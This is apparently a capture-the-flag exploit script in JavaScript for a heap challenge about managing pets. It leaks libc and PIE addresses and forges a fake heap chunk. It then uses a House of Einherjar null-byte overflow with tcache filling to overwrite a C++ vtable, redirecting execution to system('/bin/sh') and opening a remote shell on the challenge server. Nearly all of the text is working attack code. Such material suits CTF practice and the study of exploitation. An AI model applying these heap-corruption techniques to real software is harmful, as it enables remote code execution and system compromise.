import nc from "../nc.js";
import convo from "../convo.js";
import { printf, shell } from "../util.js";

const cat = new nc("nc challs.bcactf.com 30676");
await cat.open;
// cat.write("break win\nr\n");
await cat.readUntil("~~~");
const padnl = (buffer, size, fill=0x41) => {
    size = Number(size);
    return Buffer.concat([buffer, Buffer.alloc(Math.max(size - buffer.length, 0)).fill(fill), Buffer.from([0x0a])]);
}

// const LEAK1_LIBC = 0x49f60n + 238n;
const LEAK1_LIBC = 0x8ec50n;
// const SYSTEM_LIBC = 0x45e50n;;
const SYSTEM_LIBC = 0x55410n;
const BINSH_LIBC = 0x195152n;

const WIN_PIE = 0x24ebn;
const LEAK0_PIE = 0x6010n;

// await cat.toggleStdin();
// await cat.toggleStdout();

const a_NEW = 1
const a_NAME = 2
const a_WALK = 3
const a_FREE = 4

const p_DOG = 1
const p_FROG = 2
const p_FISH = 3
const p_DOGE = 4
const p_INVALID = 5
const action = async (k) => {
    await cat.readUntil("actions")
    await cat.write(k.toString() + "\n");
}
const index = async (k) => {
    await cat.readUntil("Please choose a pet index (");
    await cat.write((k + 1).toString() + "\n");
}
const name = async (k) => {
    await cat.readUntil("Pick a name for your pet!")
    await cat.write(k);
}
const location = async (k) => {
    await cat.readUntil("Where do you want to go?")
    await cat.write(k);
}
const pet_type = async (k) => {
    await cat.readUntil("What do you say?")
    await cat.write(k.toString() + "\n");
}

const readpet_leak = async () => {
    await cat.readUntil("pet type unfound; ");
    let m = await cat.readline();
    return BigInt(parseInt((m).trim()));
}

const new_pet = async (idx, nam, type) => {
    await action(a_NEW);
    await index(idx);
    await name(nam);
    await pet_type(type);

    return idx;
}

const name_pet = async (idx, nam) => {
    await action(a_NAME);
    await index(idx);
    await name(nam);
}

const free_pet = async (idx) => {
    await action(a_FREE);
    await index(idx);
}

const walk_pet = async (idx, loc) => {
    await action(a_WALK);
    await index(idx);
    await location(loc);
}

const leak_ptr = async (idx) => {
    await new_pet(idx, "name\n", p_INVALID)
    return await readpet_leak();
}

const fill_tcache = async (start, cnt=7) => {
    for (let i = 0; i < cnt; ++i) {
        await new_pet(start + i, ".\n", p_FISH);
    }
    for (let i = 0; i < cnt; ++i) {
        await free_pet(start + i);
    }
}

const LIBC = (await leak_ptr(1)) - LEAK1_LIBC;
printf("[+] libc leak; %p\n", LIBC);
const PIE = (await leak_ptr(0)) - LEAK0_PIE;
printf("[+] PIE leak; %p\n", PIE);

const CHUNK_SIZE = 0x100n;
const NAME_SPACE = CHUNK_SIZE - 0x10n;
const nullptr = 0x00n;
const FAKE_SIZE = (CHUNK_SIZE - 0x18n) + CHUNK_SIZE;

/*
Pet Class
00: VTABLE POINTER
08: NAME CONTENT ...
*/

// create our first chunk
const A = await new_pet(0, ".\n", p_DOGE);
// leak it (for free list preservation)
// 8 is where the content begins
const A_name_ptr = (await leak_ptr(0)) + 0x8n

// create fake chunk and link it to itself
await name_pet(A, padnl(convo.raw([
    nullptr, FAKE_SIZE | 1n, // prevsize, size | PREV_IN_USE
    A_name_ptr, A_name_ptr, // fw bk
]), NAME_SPACE - 0x1n /* don't overflow */, 0x00));
printf("[-] 1. A's fake chunk built @ %p\n", A_name_ptr);

const B = await new_pet(1, ".\n", p_DOGE);
const C = await new_pet(2, ".\n", p_DOGE);
printf("[-] 2. B and C both built\n");

// einherjar
await name_pet(B, padnl(convo.raw([
    "\x00".repeat(Number(NAME_SPACE - 0x8n)),
    // place fake size at the end, so that the free will consolidate down into A's fake chunk
    FAKE_SIZE
]), NAME_SPACE /* overflow 0 byte */, 0x00));
printf("[-] 3. Einherjar at B into C\n");
printf("[-] 4. C will now consolidate into A's fake chunk\n");

// attack time :)
await fill_tcache(3, 7);
printf("[-] 5. tcache filled");

// free the modified C, it will now consolidate down into A
await free_pet(C);
printf("[-] 6. free C, next chunk is A's fake chunk; right before b\n");

// all we'd need next is the ability to create a FAKE_SIZE large chunk
// to take up the fake chunk at A, at which it has overflow write access into B
// and B's vtable
// std::string auto scales in the heap so we can do this easily

// alloc with std::string
const payload = padnl(convo.raw([
    WIN_PIE + PIE, SYSTEM_LIBC + LIBC, // @ A_name_ptr + 0x10n
    Array(29 - 2).fill(nullptr),
    A_name_ptr + 0x10n, // pints to custom vtable
    "/bin/sh\x00"
]), FAKE_SIZE, 0x00);

await name_pet(B, payload);
printf("[-] 7. overrode from A's fake chunk into B's vtable\n");

await cat.readUntil("says: ");
printf("[!] shell\n");
await shell(cat)